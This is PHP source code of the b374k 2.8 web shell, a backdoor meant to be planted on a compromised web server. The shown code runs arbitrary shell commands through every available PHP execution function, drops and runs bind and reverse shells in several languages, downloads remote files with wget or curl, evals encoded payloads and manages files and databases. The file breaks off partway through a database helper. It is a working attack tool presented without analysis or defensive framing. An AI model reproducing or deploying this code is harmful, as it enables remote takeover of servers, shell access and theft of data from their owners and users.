<?php
/*
	b374k 2.8
	Jayalah Indonesiaku
	(c)2013
	http://code.google.com/p/b374k-shell

*/

// magic quote and shit :-p
function clean($arr)
{
    $quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
    if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
        if (is_array($arr)) {
            foreach ($arr as $k => $v) {
                if (is_array($v)) {
                    $arr[$k] = clean($v);
                } else {
                    $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off') ? stripslashes($v) : stripslashes(str_replace("\'\'",
                        "\'", $v));
                }
            }
        }
    }

    return $arr;
}
// function read file
function fgc($file)
{
    return file_get_contents($file);
}
// encryption for shell password
function kript($plain)
{
    return sha1(md5($plain));
}
function changepass($plain)
{
    $newpass = kript($plain);
    $newpass = "\$s_pass = \"" . $newpass . "\";";
    $con     = fgc($_SERVER['SCRIPT_FILENAME']);
    $con     = preg_replace("/\\\$s_pass\ *=\ *[\"\']*([a-fA-F0-9]*)[\"\']*;/is", $newpass, $con);

    return file_put_contents($_SERVER['SCRIPT_FILENAME'], $con);
}
function get_code($t, $c)
{
    global $s_self;
    $c = gzinflate(base64_decode($c));
    if ($t == "css") {
        return "<link rel='stylesheet' type='text/css' href='" . $s_self . "|' />";

    } elseif ($t == "js") {
        return "<script type='text/javascript' src='" . $s_self . "!'></script>";
    }
}
function showcode($raw)
{
    $c = gzinflate(base64_decode($raw));
    ob_get_contents();
    ob_end_clean();
    ob_start();
    eval("?>" . $c);
    $s_res = ob_get_contents();
    ob_end_clean();
    echo $s_res;
    die();
}
// addslashes if on windows
function adds($s_s)
{
    global $s_win;

    return ($s_win) ? addslashes($s_s) : $s_s;
}
// add slash to the end of given path
function cp($s_p)
{
    global $s_win;
    if (@is_dir($s_p)) {
        $s_x = DS;
        while (substr($s_p, - 1) == $s_x) {
            $s_p = rtrim($s_p, $s_x);
        }

        return ($s_win) ? preg_replace("/\\\\+/is", "\\", $s_p . $s_x) : $s_p . $s_x;
    }

    return $s_p;
}
// make link for folder $s_cwd and all of its parent folder
function swd($s_p)
{
    global $s_self;
    $s_ps = explode(DS, $s_p);
    $s_pu = "";
    for ($s_i = 0; $s_i < sizeof($s_ps) - 1; $s_i ++) {
        $s_pz = "";
        for ($s_j = 0; $s_j <= $s_i; $s_j ++) {
            $s_pz .= $s_ps[$s_j] . DS;
        }
        $s_pu .= "<a href='" . $s_self . "cd=" . pl($s_pz) . "'>" . $s_ps[$s_i] . " " . DS . " </a>";
    }

    return trim($s_pu);
}
// htmlspecialchars
function hss($s_t)
{
    //$s_s = htmlspecialchars($s_s, 8);
    return htmlspecialchars($s_t, 2 | 1);
}
// function raw urldecode
function ru($str)
{
    return (is_array($str)) ? array_map("rawurldecode", $str) : rawurldecode($str);
}
// encode link, htmlspecialchars and rawurlencode
function pl($str)
{
    return hss(rawurlencode($str));
}
// add quotes
function pf($f)
{
    return "\"" . $f . "\"";
}
// replace spaces with underscore ( _ )
function cs($s_t)
{
    return str_replace(array(" ", "\"", "'"), "_", $s_t);
}
// trim and urldecode
function ss($s_t)
{
    return rawurldecode($s_t);
}
// return tag html for notif
function notif($s)
{
    return "<div class='notif'>" . $s . "</div>";
}
// bind and reverse shell
function rs($s_rstype, $s_rstarget, $s_rscode)
{
    // resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php
    $s_result = $s_fpath = "";
    $s_fc     = gzinflate(base64_decode($s_rscode));

    $s_errperm  = "Directory " . getcwd() . DS . " is not writable, please change to a writable one";
    $s_errgcc   = "Unable to compile using gcc";
    $s_errjavac = "Unable to compile using javac";

    $s_split  = explode("_", $s_rstype);
    $s_method = $s_split[0];
    $s_lang   = $s_split[1];
    if ($s_lang == "py" || $s_lang == "pl" || $s_lang == "rb" || $s_lang == "js") {
        if ($s_lang == "py") {
            $s_runlang = "python";
        } elseif ($s_lang == "pl") {
            $s_runlang = "perl";
        } elseif ($s_lang == "rb") {
            $s_runlang = "ruby";
        } elseif ($s_lang == "js") {
            $s_runlang = "node";
        }
        $s_fpath = "b374k_rs." . $s_lang;
        if (@is_file($s_fpath)) {
            unlink($s_fpath);
        }
        if ($s_file = fopen($s_fpath, "w")) {
            fwrite($s_file, $s_fc);
            fclose($s_file);
            if (@is_file($s_fpath)) {
                $s_result = exe("chmod +x " . $s_fpath);
                if ($s_runlang == "node") {
                    if (check_access("node") !== false) {
                        $s_result = exe($s_runlang . " " . $s_fpath . " " . $s_rstarget);
                    } elseif (check_access("nodejs") !== false) {
                        $s_result = exe($s_runlang . "js " . $s_fpath . " " . $s_rstarget);
                    }

                } else {
                    $s_result = exe($s_runlang . " " . $s_fpath . " " . $s_rstarget);
                }
            } else {
                $s_result = $s_errperm;
            }
        } else {
            $s_result = $s_errperm;
        }
    } elseif ($s_lang == "c") {
        $s_fpath = "b374k_rs";
        if (@is_file($s_fpath)) {
            unlink($s_fpath);
        }
        if (@is_file($s_fpath . ".c")) {
            unlink($s_fpath . ".c");
        }
        if ($s_file = fopen($s_fpath . ".c", "w")) {
            fwrite($s_file, $s_fc);
            fclose($s_file);
            if (@is_file($s_fpath . ".c")) {
                $s_result = exe("gcc " . $s_fpath . ".c -o " . $s_fpath);
                if (@is_file($s_fpath)) {
                    $s_result = exe("chmod +x " . $s_fpath);
                    $s_result = exe("./" . $s_fpath . " " . $s_rstarget);
                } else {
                    $s_result = $s_errgcc;
                }
            } else {
                $s_result = $s_errperm;
            }
        } else {
            $s_result = $s_errperm;
        }
    } elseif ($s_lang == "win") {
        $s_fpath = "b374k_rs.exe";
        if (@is_file($s_fpath)) {
            unlink($s_fpath);
        }
        if ($s_file = fopen($s_fpath, "w")) {
            fwrite($s_file, $s_fc);
            fclose($s_file);
            if (@is_file($s_fpath)) {
                $s_result = exe($s_fpath . " " . $s_rstarget);
            } else {
                $s_result = $s_errperm;
            }
        } else {
            $s_result = $s_errperm;
        }
    } elseif ($s_lang == "java") {
        $s_fpath = "b374k_rs";
        if (@is_file($s_fpath . ".java")) {
            unlink($s_fpath . ".java");
        }
        if (@is_file($s_fpath . ".class")) {
            unlink($s_fpath . ".class");
        }
        if ($s_file = fopen($s_fpath . ".java", "w")) {
            fwrite($s_file, $s_fc);
            fclose($s_file);
            if (@is_file($s_fpath . ".java")) {
                $s_result = exe("javac " . $s_fpath . ".java");
                if (@is_file($s_fpath . ".class")) {
                    $s_result = exe("java " . $s_fpath . " " . $s_rstarget);
                } else {
                    $s_result = $s_errjavac;
                }
            } else {
                $s_result = $s_errperm;
            }
        } else {
            $s_result = $s_errperm;
        }
    } elseif ($s_lang == "php") {
        $s_result = eval("?>" . $s_fc);
    }

    if (@is_file($s_fpath)) {
        unlink($s_fpath);
    }
    if (@is_file($s_fpath . ".c")) {
        unlink($s_fpath . ".c");
    }
    if (@is_file($s_fpath . ".java")) {
        unlink($s_fpath . ".java");
    }
    if (@is_file($s_fpath . ".class")) {
        unlink($s_fpath . ".class");
    }
    if (@is_file($s_fpath . "\$pt.class")) {
        unlink($s_fpath . "\$pt.class");
    }

    return $s_result;
}
function geol($str)
{
    $nl = PHP_EOL;
    if (preg_match("/\r\n/", $str, $r)) {
        $nl = "\r\n";
    } else {
        if (preg_match("/\n/", $str, $r)) {
            $nl = "\n";
        } elseif (preg_match("/\r/", $str, $r)) {
            $nl = "\r";
        }
    }

    return bin2hex($nl);
}
// format bit
function ts($s_s)
{
    if ($s_s <= 0) {
        return 0;
    }
    $s_w = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    $s_e = floor(log($s_s) / log(1024));

    return sprintf('%.2f ' . $s_w[$s_e], ($s_s / pow(1024, floor($s_e))));
}
// get file size
function gs($s_f)
{
    $s_s = @filesize($s_f);
    if ($s_s !== false) {
        if ($s_s <= 0) {
            return 0;
        }

        return ts($s_s);
    } else {
        return "???";
    }
}
// get file permissions
function gp($s_f)
{
    if ($s_m = @fileperms($s_f)) {
        $s_p = 'u';
        if (($s_m & 0xC000) == 0xC000) {
            $s_p = 's';
        } elseif (($s_m & 0xA000) == 0xA000) {
            $s_p = 'l';
        } elseif (($s_m & 0x8000) == 0x8000) {
            $s_p = '-';
        } elseif (($s_m & 0x6000) == 0x6000) {
            $s_p = 'b';
        } elseif (($s_m & 0x4000) == 0x4000) {
            $s_p = 'd';
        } elseif (($s_m & 0x2000) == 0x2000) {
            $s_p = 'c';
        } elseif (($s_m & 0x1000) == 0x1000) {
            $s_p = 'p';
        }
        $s_p .= ($s_m & 00400) ? 'r' : '-';
        $s_p .= ($s_m & 00200) ? 'w' : '-';
        $s_p .= ($s_m & 00100) ? 'x' : '-';
        $s_p .= ($s_m & 00040) ? 'r' : '-';
        $s_p .= ($s_m & 00020) ? 'w' : '-';
        $s_p .= ($s_m & 00010) ? 'x' : '-';
        $s_p .= ($s_m & 00004) ? 'r' : '-';
        $s_p .= ($s_m & 00002) ? 'w' : '-';
        $s_p .= ($s_m & 00001) ? 'x' : '-';

        return $s_p;
    } else {
        return "???????????";
    }
}
// shell command
function exe($s_c)
{
    $s_out = "";
    $s_c   = $s_c . " 2>&1";

    if (is_callable('system')) {
        ob_start();
        @system($s_c);
        $s_out = ob_get_contents();
        ob_end_clean();
        if (!empty($s_out)) {
            return $s_out;
        }
    }
    if (is_callable('shell_exec')) {
        $s_out = @shell_exec($s_c);
        if (!empty($s_out)) {
            return $s_out;
        }
    }
    if (is_callable('exec')) {
        @exec($s_c, $s_r);
        if (!empty($s_r)) {
            foreach ($s_r as $s_s) {
                $s_out .= $s_s;
            }
        }
        if (!empty($s_out)) {
            return $s_out;
        }
    }
    if (is_callable('passthru')) {
        ob_start();
        @passthru($s_c);
        $s_out = ob_get_contents();
        ob_end_clean();
        if (!empty($s_out)) {
            return $s_out;
        }
    }
    if (is_callable('proc_open')) {
        $s_descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $s_proc           = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());
        if (is_resource($s_proc)) {
            while ($s_si = fgets($s_pipes[1])) {
                if (!empty($s_si)) {
                    $s_out .= $s_si;
                }
            }
            while ($s_se = fgets($s_pipes[2])) {
                if (!empty($s_se)) {
                    $s_out .= $s_se;
                }
            }
        }
        @proc_close($s_proc);
        if (!empty($s_out)) {
            return $s_out;
        }
    }
    if (is_callable('popen')) {
        $s_f = @popen($s_c, 'r');
        if ($s_f) {
            while (!feof($s_f)) {
                $s_out .= fread($s_f, 2096);
            }
            pclose($s_f);
        }
        if (!empty($s_out)) {
            return $s_out;
        }
    }

    return "";
}
// delete dir and all of its content (no warning !) xp
function rmdirs($s)
{
    $s = (substr($s, - 1) == '/') ? $s : $s . '/';
    if ($dh = opendir($s)) {
        while (($f = readdir($dh)) !== false) {
            if (($f != '.') && ($f != '..')) {
                $f = $s . $f;
                if (@is_dir($f)) {
                    rmdirs($f);
                } else {
                    @unlink($f);
                }
            }
        }
        closedir($dh);
        @rmdir($s);
    }
}
function copys($s, $d, $c = 0)
{
    if ($dh = opendir($s)) {
        if (!@is_dir($d)) {
            @mkdir($d);
        }
        while (($f = readdir($dh)) !== false) {
            if (($f != '.') && ($f != '..')) {
                if (@is_dir($s . DS . $f)) {
                    copys($s . DS . $f, $d . DS . $f);
                } else {
                    copy($s . DS . $f, $d . DS . $f);
                }
            }
        }
        closedir($dh);
    }
}
// get array of all files from given directory
function getallfiles($s_dir)
{
    $s_f = glob($s_dir . '*');
    for ($s_i = 0; $s_i < count($s_f); $s_i ++) {
        if (@is_dir($s_f[$s_i])) {
            $s_a = glob($s_f[$s_i] . DS . '*');
            if (is_array($s_f) && is_array($s_a)) {
                $s_f = array_merge($s_f, $s_a);
            }
        }
    }

    return $s_f;
}
// download file from internet
function dlfile($s_u, $s_p)
{
    global $s_wget, $s_lwpdownload, $s_lynx, $s_curl;

    if (!preg_match("/[a-z]+:\/\/.+/", $s_u)) {
        return false;
    }
    $s_n = basename($s_u);

    // try using php functions
    if ($s_t = @fgc($s_u)) {

        if (@is_file($s_p)) {
            unlink($s_p);
        }
        if ($s_f = fopen($s_p, "w")) {
            fwrite($s_f, $s_t);
            fclose($s_f);
            if (@is_file($s_p)) {
                return true;
            }
        }
    }
    // using wget
    if ($s_wget) {
        $buff = exe("wget " . $s_u . " -O " . $s_p);
        if (@is_file($s_p)) {
            return true;
        }
    }
    // try using curl
    if ($s_curl) {
        $buff = exe("curl " . $s_u . " -o " . $s_p);
        if (@is_file($s_p)) {
            return true;
        }
    }
    // try using lynx
    if ($s_lynx) {
        $buff = exe("lynx -source " . $s_u . " > " . $s_p);
        if (@is_file($s_p)) {
            return true;
        }
    }
    // try using lwp-download
    if ($s_lwpdownload) {
        $buff = exe("lwp-download " . $s_u . " " . $s_p);
        if (@is_file($s_p)) {
            return true;
        }
    }

    return false;
}
// find writable dir
function get_writabledir()
{
    if (!$s_d = getenv("TEMP")) {
        if (!$s_d = getenv("TMP")) {
            if (!$s_d = getenv("TMPDIR")) {
                if (@is_writable("/tmp")) {
                    $s_d = "/tmp/";
                } else {
                    if (@is_writable(".")) {
                        $s_d = "." . DS;
                    }
                }
            }
        }
    }

    return cp($s_d);
}
// zip function
function zip($s_srcarr, $s_dest)
{
    if (!extension_loaded('zip')) {
        return false;
    }
    if (class_exists("ZipArchive")) {
        $s_zip = new ZipArchive();
        if (!$s_zip->open($s_dest, 1)) {
            return false;
        }

        if (!is_array($s_srcarr)) {
            $s_srcarr = array($s_srcarr);
        }
        foreach ($s_srcarr as $s_src) {
            $s_src = str_replace('\\', '/', $s_src);
            if (@is_dir($s_src)) {
                $s_files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($s_src), 1);
                foreach ($s_files as $s_file) {
                    $s_file = str_replace('\\', '/', $s_file);
                    if (in_array(substr($s_file, strrpos($s_file, '/') + 1), array('.', '..'))) {
                        continue;
                    }
                    if (@is_dir($s_file) === true) {
                        $s_zip->addEmptyDir(str_replace($s_src . '/', '', $s_file . '/'));
                    } else {
                        if (@is_file($s_file) === true) {
                            $s_zip->addFromString(str_replace($s_src . '/', '', $s_file), @fgc($s_file));
                        }
                    }
                }
            } elseif (@is_file($s_src) === true) {
                $s_zip->addFromString(basename($s_src), @fgc($s_src));
            }
        }
        $s_zip->close();

        return true;
    }
}
// check shell permission to access program
function check_access($s_lang)
{
    $s_s = false;
    $ver = "";
    switch ($s_lang) {
        case "python":
            $s_cek = strtolower(exe("python -h"));
            if (strpos($s_cek, "usage") !== false) {
                $ver = exe("python -V");
            }
            break;
        case "perl":
            $s_cek = strtolower(exe("perl -h"));
            if (strpos($s_cek, "usage") !== false) {
                $ver = exe("perl -e \"print \$]\"");
            }
            break;
        case "ruby":
            $s_cek = strtolower(exe("ruby -h"));
            if (strpos($s_cek, "usage") !== false) {
                $ver = exe("ruby -v");
            }
            break;
        case "node":
            $s_cek = strtolower(exe("node -h"));
            if (strpos($s_cek, "usage") !== false) {
                $ver = exe("node -v");
            }
            break;
        case "nodejs":
            $s_cek = strtolower(exe("nodejs -h"));
            if (strpos($s_cek, "usage") !== false) {
                $ver = exe("nodejs -v");
            }
            break;
        case "gcc":
            $s_cek = strtolower(exe("gcc --help"));
            if (strpos($s_cek, "usage") !== false) {
                $s_ver = exe("gcc --version");
                $s_ver = explode("\n", $s_ver);
                if (count($s_ver) > 0) {
                    $ver = $s_ver[0];
                }
            }
            break;
        case "tar":
            $s_cek = strtolower(exe("tar --help"));
            if (strpos($s_cek, "usage") !== false) {
                $s_ver = exe("tar --version");
                $s_ver = explode("\n", $s_ver);
                if (count($s_ver) > 0) {
                    $ver = $s_ver[0];
                }
            }
            break;
        case "java":
            $s_cek = strtolower(exe("java -help"));
            if (strpos($s_cek, "usage") !== false) {
                $ver = str_replace("\n", ", ", exe("java -version"));
            }
            break;
        case "javac":
            $s_cek = strtolower(exe("javac -help"));
            if (strpos($s_cek, "usage") !== false) {
                $ver = str_replace("\n", ", ", exe("javac -version"));
            }
            break;
        case "wget":
            $s_cek = strtolower(exe("wget --help"));
            if (strpos($s_cek, "usage") !== false) {
                $s_ver = exe("wget --version");
                $s_ver = explode("\n", $s_ver);
                if (count($s_ver) > 0) {
                    $ver = $s_ver[0];
                }
            }
            break;
        case "lwpdownload":
            $s_cek = strtolower(exe("lwp-download --help"));
            if (strpos($s_cek, "usage") !== false) {
                $s_ver = exe("lwp-download --version");
                $s_ver = explode("\n", $s_ver);
                if (count($s_ver) > 0) {
                    $ver = $s_ver[0];
                }
            }
            break;
        case "lynx":
            $s_cek = strtolower(exe("lynx --help"));
            if (strpos($s_cek, "usage") !== false) {
                $s_ver = exe("lynx -version");
                $s_ver = explode("\n", $s_ver);
                if (count($s_ver) > 0) {
                    $ver = $s_ver[0];
                }
            }
            break;
        case "curl":
            $s_cek = strtolower(exe("curl --help"));
            if (strpos($s_cek, "usage") !== false) {
                $s_ver = exe("curl --version");
                $s_ver = explode("\n", $s_ver);
                if (count($s_ver) > 0) {
                    $ver = $s_ver[0];
                }
            }
            break;
        default:
            return false;
    }
    if (!empty($ver)) {
        $s_s = $ver;
    }

    return $s_s;
}
// explorer, return a table of given dir
function showdir($s_cwd)
{
    global $s_self, $s_win, $s_posix, $s_tar;

    $s_fname      = $s_dname = array();
    $s_total_file = $s_total_dir = 0;

    if ($s_dh = @opendir($s_cwd)) {
        while ($s_file = @readdir($s_dh)) {
            if (@is_dir($s_file)) {
                $s_dname[] = $s_file;
            } elseif (@is_file($s_file)) {
                $s_fname[] = $s_file;
            }
        }
        closedir($s_dh);
    }

    natcasesort($s_fname);
    natcasesort($s_dname);
    $s_list = array_merge($s_dname, $s_fname);

    if ($s_win) {
        //check if this root directory
        chdir("..");
        if (cp(getcwd()) == cp($s_cwd)) {
            array_unshift($s_list, ".");
        }
        chdir($s_cwd);
    }

    $s_path = explode(DS, $s_cwd);
    $s_tree = sizeof($s_path);

    $s_parent = "";
    if ($s_tree > 2) {
        for ($s_i = 0; $s_i < $s_tree - 2; $s_i ++) {
            $s_parent .= $s_path[$s_i] . DS;
        }
    } else {
        $s_parent = $s_cwd;
    }

    $s_owner_html = (!$s_win && $s_posix) ? "<th style='width:140px;min-width:140px;'>owner:group</th>" : "";
    $s_colspan    = (!$s_win && $s_posix) ? "5" : "4";
    $s_buff       = "<table class='explore sortable'><thead><tr><th style='width:24px;min-width:24px;' class='sorttable_nosort'></th><th style='min-width:150px;'>name</th><th style='width:74px;min-width:74px;'>size</th>" . $s_owner_html . "<th style='width:80px;min-width:80px;'>perms</th><th style='width:150px;min-width:150px;'>modified</th><th style='width:200px;min-width:200px;' class='sorttable_nosort'>action</th></tr></thead><tbody>";


    foreach ($s_list as $s_l) {
        if (!$s_win && $s_posix) {
            $s_name       = posix_getpwuid(fileowner($s_l));
            $s_group      = posix_getgrgid(filegroup($s_l));
            $s_owner      = $s_name['name'] . "<span class='gaya'>:</span>" . $s_group['name'];
            $s_owner_html = "<td style='text-align:center;'>" . $s_owner . "</td>";
        }

        $s_lhref = $s_lname = $s_laction = "";
        if (@is_dir($s_l)) {
            if ($s_l == ".") {
                $s_lhref   = $s_self . "cd=" . pl($s_cwd);
                $s_lsize   = "LINK";
                $s_laction = "<span id='titik1'><a href='" . $s_self . "cd=" . pl($s_cwd) . "&find=" . pl($s_cwd) . "'>find</a> | <a href='" . $s_self . "cd=" . pl($s_cwd) . "&x=upload" . "'>upl</a> | <a href='" . $s_self . "cd=" . pl($s_cwd) . "&edit=" . pl($s_cwd) . "newfile_1&new=yes" . "'>+file</a> | <a href=\"javascript:tukar('titik1','', 'mkdir','newfolder_1');\">+dir</a></span><div id='titik1_form'></div>";
            } elseif ($s_l == "..") {
                $s_lhref   = $s_self . "cd=" . pl($s_parent);
                $s_lsize   = "LINK";
                $s_laction = "<span id='titik2'><a href='" . $s_self . "cd=" . pl($s_parent) . "&find=" . pl($s_parent) . "'>find</a> | <a href='" . $s_self . "cd=" . pl($s_parent) . "&x=upload" . "'>upl</a> | <a href='" . $s_self . "cd=" . pl($s_parent) . "&edit=" . pl($s_parent) . "newfile_1&new=yes" . "'>+file</a> | <a href=\"javascript:tukar('titik2','" . adds($s_parent) . "', 'mkdir','newfolder_1');\">+dir</a></span><div id='titik2_form'></div>";
            } else {
                $s_lhref   = $s_self . "cd=" . pl($s_cwd . $s_l . DS);
                $s_lsize   = "DIR";
                $s_laction = "<span id='" . cs($s_l) . "_'><a href='" . $s_self . "cd=" . pl($s_cwd . $s_l . DS) . "&find=" . pl($s_cwd . $s_l . DS) . "'>find</a> | <a href='" . $s_self . "cd=" . pl($s_cwd . $s_l . DS) . "&x=upload" . "'>upl</a> | <a href=\"javascript:tukar('" . cs($s_l) . "_','','rename','" . adds($s_l) . "','" . adds($s_l) . "');\">ren</a> | <a href='" . $s_self . "cd=" . pl($s_cwd) . "&del=" . pl($s_l) . "'>del</a></span><div id='" . cs($s_l) . "__form'></div>";
                $s_total_dir ++;
            }
            $s_lname    = "[ " . $s_l . " ]";
            $s_lsizetit = "0";
            $s_lnametit = "dir : " . $s_l;
        } else {
            $s_lhref    = $s_self . "view=" . pl($s_cwd . $s_l);
            $s_lname    = $s_l;
            $s_lsize    = gs($s_l);
            $s_lsizetit = @filesize($s_l);
            $s_lnametit = "file : " . $s_l;
            $s_laction  = "<span id='" . cs($s_l) . "_'><a href='" . $s_self . "edit=" . pl($s_cwd . $s_l) . "'>edit</a> | <a href='" . $s_self . "hexedit=" . pl($s_cwd . $s_l) . "'>hex</a> | <a href=\"javascript:tukar('" . cs($s_l) . "_','','rename','" . adds($s_l) . "','" . adds($s_l) . "');\">ren</a> | <a href='" . $s_self . "del=" . pl($s_cwd . $s_l) . "'>del</a> | <a href='" . $s_self . "dl=" . pl($s_cwd . $s_l) . "'>dl</a></span><div id='" . cs($s_l) . "__form'></div>";
            $s_total_file ++;
        }

        $s_cboxval = $s_cwd . $s_l;
        if ($s_l == '.') {
            $s_cboxval = $s_cwd;
        }
        if ($s_l == '..') {
            $s_cboxval = $s_parent;
        }

        $s_cboxes_id = substr(md5($s_lhref), 0, 8);
        $s_cboxes    = "<input id='" . $s_cboxes_id . "' name='cbox' value='" . hss($s_cboxval) . "' type='checkbox' class='css-checkbox' onchange='hilite(this);' /><label for='" . $s_cboxes_id . "' class='css-label'></label>";

        $s_ltime = filemtime($s_l);
        $s_buff .= "<tr><td style='text-align:center;text-indent:4px;'>" . $s_cboxes . "</td><td class='xpl' title='" . $s_lnametit . "' ondblclick=\"return go('" . adds($s_lhref) . "',event);\"><a href='" . $s_lhref . "'>" . $s_lname . "</a></td><td title='" . $s_lsizetit . "'>" . $s_lsize . "</td>" . $s_owner_html . "<td class='ce'>" . gp($s_l) . "</td><td class='ce' title='" . $s_ltime . "'>" . @date("d-M-Y H:i:s",
                $s_ltime) . "</td><td>" . $s_laction . "</td></tr>";
    }
    $s_buff .= "</tbody>";

    $s_extract  = "";
    $s_compress = "";
    if (class_exists("ZipArchive")) {
        $s_extract .= "<option value='extractzip'>extract (zip)</option>";
        $s_compress .= "<option value='compresszip'>compress (zip)</option>";
    }
    if ($s_tar) {
        $s_extract .= "<option value='extracttar'>extract (tar)</option><option value='extracttargz'>extract (tar.gz)</option>";
        $s_compress .= "<option value='compresstar'>compress (tar)</option><option value='compresstargz'>compress (tar.gz)</option>";
    }

    $s_extcom = ($s_extract != "" && $s_compress != "") ? $s_extract . "<option value='' disabled>-</option>" . $s_compress : $s_extract . $s_compress;

    $s_buff .= "<tfoot><tr class='cbox_selected'><td class='cbox_all'><input id='checkalll' type='checkbox' name='abox' class='css-checkbox' onclick='checkall();' /> <label for='checkalll' class='css-label'></label></td><td><form action='" . $s_self . "' method='post'><select id='massact' class='inputzbut' onchange='massactgo();' style='width:100%;height:20px;margin:0;'><option value='' disabled selected>Action</option><option value='cut'>cut</option><option value='copy'>copy</option><option value='paste'>paste</option><option value='delete'>delete</option><option value='' disabled>-</option><option value='chmod'>chmod</option><option value='touch'>touch</option><option value='' disabled>-</option>" . $s_extcom . "</select><noscript><input type='button' value='Go !' class='inputzbut' onclick='massactgo();' /></noscript></form></td><td colspan='" . $s_colspan . "' style='text-align:left;'>Total : " . $s_total_file . " files, " . $s_total_dir . " Directories<span id='total_selected'></span></td></tr></tfoot></table>";

    return $s_buff;
}
//database related functions
function sql_connect($s_sqltype, $s_sqlhost, $s_sqluser, $s_sqlpass)
{
    if ($s_sqltype == 'mysql') {
        if (class_exists('mysqli')) {
            return new mysqli($s_sqlhost, $s_sqluser, $s_sqlpass);
        } elseif (function_exists('mysql_connect')) {
            return @mysql_connect($s_sqlhost, $s_sqluser, $s_sqlpass);
        }
    } elseif ($s_sqltype == 'mssql') {
        if (function_exists('sqlsrv_connect')) {
            $s_coninfo = array("UID" => $s_sqluser, "PWD" => $s_sqlpass);

            return @sqlsrv_connect($s_sqlhost, $s_coninfo);
        } elseif (function_exists('mssql_connect')) {
            return @mssql_connect($s_sqlhost, $s_sqluser, $s_sqlpass);
        }
    } elseif ($s_sqltype == 'pgsql') {
        $s_hosts = explode(":", $s_sqlhost);
        if (count($s_hosts) == 2) {
            $s_host_str = "host=" . $s_hosts[0] . " port=" . $s_hosts[1];
        } else {
            $s_host_str = "host=" . $s_sqlhost;
        }
        if (function_exists('pg_connect')) {
            return @pg_connect("$s_host_str user=$s_sqluser password=$s_sqlpass");
        }
    } elseif ($s_sqltype == 'oracle') {
        if (function_exists('oci_connect')) {
            return @oci_connect($s_sqluser, $s_sqlpass, $s_sqlhost);
        }
    } elseif ($s_sqltype == 'sqlite3') {
        if (class_exists('SQLite3')) {
            if (!empty($s_sqlhost)) {
                return new SQLite3($s_sqlhost);
            } else {
                return false;
            }
        }
    } elseif ($s_sqltype == 'sqlite') {
        if (function_exists('sqlite_open')) {
            return @sqlite_open($s_sqlhost);
        }
    } elseif ($s_sqltype == 'odbc') {
        if (function_exists('odbc_connect')) {
            return @odbc_connect($s_sqlhost, $s_sqluser, $s_sqlpass);
        }
    } elseif ($s_sqltype == 'pdo') {
        if (class_exists('PDO')) {
            if (!empty($s_sqlhost)) {
                return new PDO($s_sqlhost, $s_sqluser, $s_sqlpass);
            } else {
                return false;
            }
        }
    }

    return false;
}
function sql_query($s_sqltype, $s_query, $s_con)
{
    if ($s_sqltype == 'mysql') {
        if (class_exists('mysqli')) {
            return $s_con->query($s_query);
        } elseif (function_exists('mysql_query')) {
            return mysql_query($s_query);
        }
    } elseif ($s_sqltype == 'mssql') {
        if (function_exists('sqlsrv_query')) {
            return sqlsrv_query($s_con, $s_query);
        } elseif (function_exists('mssql_query')) {
            return mssql_query($s_query);
        }
    } elseif ($s_sqltype == 'pgsql') {
        return pg_query($s_query);
    } elseif ($s_sqltype == 'oracle') {
        return oci_execute(oci_parse($s_con, $s_query));
    } elseif ($s_sqltype == 'sqlite3') {
        return $s_con->query($s_query);
    } elseif ($s_sqltype == 'sqlite') {
        return sqlite_query($s_con, $s_query);
    } elseif ($s_sqltype == 'odbc') {
        return odbc_exec($s_con, $s_query);
    } elseif ($s_sqltype == 'pdo') {
        return $s_con->query($s_query);
    }
}
function sql_num_rows($s_sqltype, $s_hasil)
{
    if ($s_sqltype == 'mysql') {
        if (class_exists('mysqli_result')) {
            return $s_hasil->mysqli_num_rows;
        } elseif (function_exists('mysql_num_rows')) {
            return mysql_num_rows($s_hasil);
        }
    } elseif ($s_sqltype == 'mssql') {
        if (function_exists('sqlsrv_num_rows')) {
            return sqlsrv_num_rows($s_hasil);
        } elseif (function_exists('mssql_num_rows')) {
            return mssql_num_rows($s_hasil);
        }
    } elseif ($s_sqltype == 'pgsql') {
        return pg_num_rows($s_hasil);
    } elseif ($s_sqltype == 'oracle') {
        return oci_num_rows($s_hasil);
    } elseif ($s_sqltype == 'sqlite3') {
        $s_metadata = $s_hasil->fetchArray();
        if (is_array($s_metadata)) {
            return $s_metadata['count'];
        }
    } elseif ($s_sqltype == 'sqlite') {
        return sqlite_num_rows($s_hasil);
    } elseif ($s_sqltype == 'odbc') {
        return odbc_num_rows($s_hasil);
    } elseif ($s_sqltype == 'pdo') {
        return $s_hasil->rowCount();
    }
}
function sql_num_fields($s_sqltype, $s_hasil)
{
    if ($s_sqltype == 'mysql') {
        if (class_exists('mysqli_result')) {
            return $s_hasil->field_count;
        } elseif (function_exists('mysql_num_fields')) {
            return mysql_num_fields($s_hasil);
        }
    } elseif ($s_sqltype == 'mssql') {
        if (function_exists('sqlsrv_num_fields')) {
            return sqlsrv_num_fields($s_hasil);
        } elseif (function_exists('mssql_num_fields')) {
            return mssql_num_fields($s_hasil);
        }
    } elseif ($s_sqltype == 'pgsql') {
        return pg_num_fields($s_hasil);
    } elseif ($s_sqltype == 'oracle') {
        return oci_num_fields($s_hasil);
    } elseif ($s_sqltype == 'sqlite3') {
        return $s_hasil->numColumns();
    } elseif ($s_sqltype == 'sqlite') {
        return sqlite_num_fields($s_hasil);
    } elseif ($s_sqltype == 'odbc') {
        return odbc_num_fields($s_hasil);
    } elseif ($s_sqltype == 'pdo') {
        return $s_hasil->columnCount();
    }
}
function sql_field_name($s_sqltype, $s_hasil, $s_i)
{
    if ($s_sqltype == 'mysql') {
        if (class_exists('mysqli_result')) {
            $z = $s_hasil->fetch_field();

            return $z->name;
        } elseif (function_exists('mysql_field_name')) {
            return mysql_field_name($s_hasil, $s_i);
        }
    } elseif ($s_sqltype == 'mssql') {
        if (function_exists('sqlsrv_field_metadata')) {
            $s_metadata = sqlsrv_field_metadata($s_hasil);
            if (is_array($s_metadata)) {
                $s_metadata = $s_metadata[$s_i];
            }
            if (is_array($s_metadata)) {
                return $s_metadata['Name'];
            }
